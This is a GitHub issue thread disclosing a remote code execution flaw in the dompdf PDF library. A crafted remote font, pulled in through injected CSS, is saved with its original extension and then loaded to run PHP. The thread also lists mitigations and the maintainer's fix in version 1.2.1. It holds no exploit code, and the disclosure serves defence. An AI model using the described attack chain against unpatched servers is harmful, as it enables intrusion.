  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdompdf%2Fdompdf%2Fissues%2F2598)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=dompdf%2Fdompdf)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[dompdf](/dompdf)
/
**[dompdf](/dompdf/dompdf)**
Public

* [Notifications](/login?return_to=%2Fdompdf%2Fdompdf) You must be signed in to change notification settings
* [Fork
  1.8k](/login?return_to=%2Fdompdf%2Fdompdf)
* [Star
   10.6k](/login?return_to=%2Fdompdf%2Fdompdf)

* [Code](/dompdf/dompdf)
* [Issues
  536](/dompdf/dompdf/issues)
* [Pull requests
  32](/dompdf/dompdf/pulls)
* [Discussions](/dompdf/dompdf/discussions)
* [Actions](/dompdf/dompdf/actions)
* [Projects
  0](/dompdf/dompdf/projects)
* [Wiki](/dompdf/dompdf/wiki)
* [Security](/dompdf/dompdf/security)
* [Insights](/dompdf/dompdf/pulse)

Additional navigation options

* [Code](/dompdf/dompdf)
* [Issues](/dompdf/dompdf/issues)
* [Pull requests](/dompdf/dompdf/pulls)
* [Discussions](/dompdf/dompdf/discussions)
* [Actions](/dompdf/dompdf/actions)
* [Projects](/dompdf/dompdf/projects)
* [Wiki](/dompdf/dompdf/wiki)
* [Security](/dompdf/dompdf/security)
* [Insights](/dompdf/dompdf/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fdompdf%2Fdompdf%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fdompdf%2Fdompdf%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Remote code execution vulnerability through persisted font #2598

Closed

[breakingsystems](/breakingsystems) opened this issue
Oct 12, 2021
· 2 comments
 · Fixed by [#2808](https://github.com/dompdf/dompdf/pull/2808)

Closed

# [Remote code execution vulnerability through persisted font](#top) #2598

[breakingsystems](/breakingsystems) opened this issue
Oct 12, 2021
· 2 comments
 · Fixed by [#2808](https://github.com/dompdf/dompdf/pull/2808)

Labels
[Priority-High](/dompdf/dompdf/labels/Priority-High)
[security](/dompdf/dompdf/labels/security)

Milestone
[1.2.1](/dompdf/dompdf/milestone/24 "1.2.1")

## Comments

[![@breakingsystems](https://avatars.githubusercontent.com/u/72152138?s=80&v=4)](/breakingsystems)

Copy link

### **[breakingsystems](/breakingsystems)** commented [Oct 12, 2021](#issue-1023878745) • edited by bsweeney Loading

| A malicious user is able to use Dompdf to execute code remotely under the following conditions:   * the Dompdf font directory (dompdf/lib/fonts by default) is accessible through the web * a remote user is able to inject CSS into a document rendered by Dompdf   On a vulnerable system a user can reference a specially crafted font file that is able to pass the initial parsing process, at which time Dompdf persists the font file to the font directory with an extension matching that of the file on the remote system. At this point the user is able to load the persisted file to execute code within the context of the PHP process.  Recommended mitigations for Dompdf versions prior to 1.2.1:   * move Dompdf and/or the Dompdf font directory outside the web root * disable access to remote resources by setting the isRemoteEnabled option to false * sanitize user input   Vulnerability details are available on the [Positive Security blog](https://positive.security/blog/dompdf-rce).  Refer to the wiki for additional information on [securing Dompdf](https://github.com/dompdf/dompdf/wiki/Securing-dompdf). |
| --- |
| The text was updated successfully, but these errors were encountered: |

 👍
3
 0xRadi, Ching367436, and Jamr141 reacted with thumbs up emoji

All reactions

* 👍
  3 reactions

[![@breakingsystems](https://avatars.githubusercontent.com/u/72152138?s=40&v=4)](/breakingsystems)
[breakingsystems](/breakingsystems)
changed the title
~~Security vulnerabilty in dompdf~~
Vulnerability in dompdf
[Oct 12, 2021](#event-5449982183)

[![@bsweeney](https://avatars.githubusercontent.com/u/485897?s=40&v=4)](/bsweeney)
[bsweeney](/bsweeney)
added this to the [2.0.0](/dompdf/dompdf/milestone/17) milestone
[Oct 13, 2021](#event-5457184928)

[![@bsweeney](https://avatars.githubusercontent.com/u/485897?s=80&v=4)](/bsweeney)

Copy link

Member

### **[bsweeney](/bsweeney)** commented [Oct 13, 2021](#issuecomment-942306154)

| I apologize for the delay. We have received the information and will review. |
| --- |

All reactions

Sorry, something went wrong.

[![@bsweeney](https://avatars.githubusercontent.com/u/485897?s=40&v=4)](/bsweeney)
[bsweeney](/bsweeney)
added
the
[security](/dompdf/dompdf/labels/security)
label
[Oct 13, 2021](#event-5457185665)

[![@bsweeney](https://avatars.githubusercontent.com/u/485897?s=40&v=4)](/bsweeney)
[bsweeney](/bsweeney)
modified the milestones:
[2.0.0](/dompdf/dompdf/milestone/17),
[1.2.1](/dompdf/dompdf/milestone/24)
[Mar 16, 2022](#event-6254140622)

[![@bsweeney](https://avatars.githubusercontent.com/u/485897?s=40&v=4)](/bsweeney)
[bsweeney](/bsweeney)
changed the title
~~Vulnerability in dompdf~~
Remote code execution vulnerability through persisted font
[Mar 16, 2022](#event-6254600725)

[![@bsweeney](https://avatars.githubusercontent.com/u/485897?s=40&v=4)](/bsweeney)
[bsweeney](/bsweeney)
added
the
[Priority-High](/dompdf/dompdf/labels/Priority-High)
label
[Mar 16, 2022](#event-6254656543)

[![@bsweeney](https://avatars.githubusercontent.com/u/485897?s=80&v=4)](/bsweeney)

Copy link

Member

### **[bsweeney](/bsweeney)** commented [Mar 17, 2022](#issuecomment-1069759835)

| FYI, after reviewing the vulnerability and in consideration of the public release I'm going to include a patch in the upcoming 1.2.1 release. |
| --- |

 👍
1
 TimexPeachtree reacted with thumbs up emoji
 ❤️
1
 TimexPeachtree reacted with heart emoji

All reactions

* 👍
  1 reaction
* ❤️
  1 reaction

Sorry, something went wrong.

[bsweeney](/bsweeney)
added a commit
that referenced
this issue
[Mar 17, 2022](#ref-commit-00b2b36)
[![@bsweeney](https://avatars.githubusercontent.com/u/485897?s=40&v=4)](/bsweeney)

`[Match installed font filename extension to type](/dompdf/dompdf/commit/00b2b360ace768d58430f1cc5a20cb43d58bbc1a "Match installed font filename extension to type

fixes #2598")`
…

`[00b2b36](/dompdf/dompdf/commit/00b2b360ace768d58430f1cc5a20cb43d58bbc1a)`

```
fixes [#2598](https://github.com/dompdf/dompdf/issues/2598)
```

[![@bsweeney](https://avatars.githubusercontent.com/u/485897?s=40&v=4)](/bsweeney)
[bsweeney](/bsweeney)
linked a pull request
[Mar 17, 2022](#event-6254720603)
that will
close
this issue

[Match installed font filename extension to type
#2808](/dompdf/dompdf/pull/2808)
 Merged

[![@bsweeney](https://avatars.githubusercontent.com/u/485897?s=40&v=4)](/bsweeney)
[bsweeney](/bsweeney)
closed this as [completed](/dompdf/dompdf/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
in
[#2808](/dompdf/dompdf/pull/2808)
[Mar 21, 2022](#event-6278866039)

[bsweeney](/bsweeney)
added a commit
that referenced
this issue
[Mar 21, 2022](#ref-commit-4c70e10)
[![@bsweeney](https://avatars.githubusercontent.com/u/485897?s=40&v=4)](/bsweeney)

`[Match installed font filename extension to type](/dompdf/dompdf/commit/4c70e1025bcd9b7694b95dd552499bd83cd6141d "Match installed font filename extension to type

fixes #2598")`
…

`[4c70e10](/dompdf/dompdf/commit/4c70e1025bcd9b7694b95dd552499bd83cd6141d)`

```
fixes [#2598](https://github.com/dompdf/dompdf/issues/2598)
```

[keulinho](/keulinho)
pushed a commit
to shopwareLabs/dompdf
that referenced
this issue
[Apr 12, 2022](#ref-commit-e4b182d)
[![@bsweeney](https://avatars.githubusercontent.com/u/485897?s=40&v=4)](/bsweeney) [![@keulinho](https://avatars.githubusercontent.com/u/15930605?s=40&v=4)](/keulinho)

`[Match installed font filename extension to type](/shopwareLabs/dompdf/commit/e4b182d5c1c55a0343199173dabcdc9abf392451 "Match installed font filename extension to type

fixes #2598")`
…

`[e4b182d](/shopwareLabs/dompdf/commit/e4b182d5c1c55a0343199173dabcdc9abf392451)`

```
fixes [dompdf#2598](https://github.com/dompdf/dompdf/issues/2598)
```

[![@stof](https://avatars.githubusercontent.com/u/439401?s=40&v=4)](/stof)
[stof](/stof)
mentioned this issue
[Apr 12, 2022](#ref-pullrequest-1201950322)

[Add CVE-2022-28368 for Dompdf
FriendsOfPHP/security-advisories#625](/FriendsOfPHP/security-advisories/pull/625)
 Merged

[![@bsweeney](https://avatars.githubusercontent.com/u/485897?s=40&v=4)](/bsweeney)
[bsweeney](/bsweeney)
mentioned this issue
[May 30, 2022](#ref-issue-1252024496)

[Remote Code Execution Vulnerablility
#2901](/dompdf/dompdf/issues/2901)

Closed

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fdompdf%2Fdompdf%2Fissues%2F2598)

Assignees

No one assigned

Labels

[Priority-High](/dompdf/dompdf/labels/Priority-High)
[security](/dompdf/dompdf/labels/security)

Projects

None yet

Milestone

 [**1.2.1**](/dompdf/dompdf/milestone/24 "1.2.1")

Development

Successfully merging a pull request may close this issue.

 [Match installed font filename extension to type](/dompdf/dompdf/pull/2808)
 [dompdf/dompdf](/dompdf/dompdf)

2 participants

[![@bsweeney](https://avatars.githubusercontent.com/u/485897?s=52&v=4)](/bsweeney) [![@breakingsystems](https://avatars.githubusercontent.com/u/72152138?s=52&v=4)](/breakingsystems)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


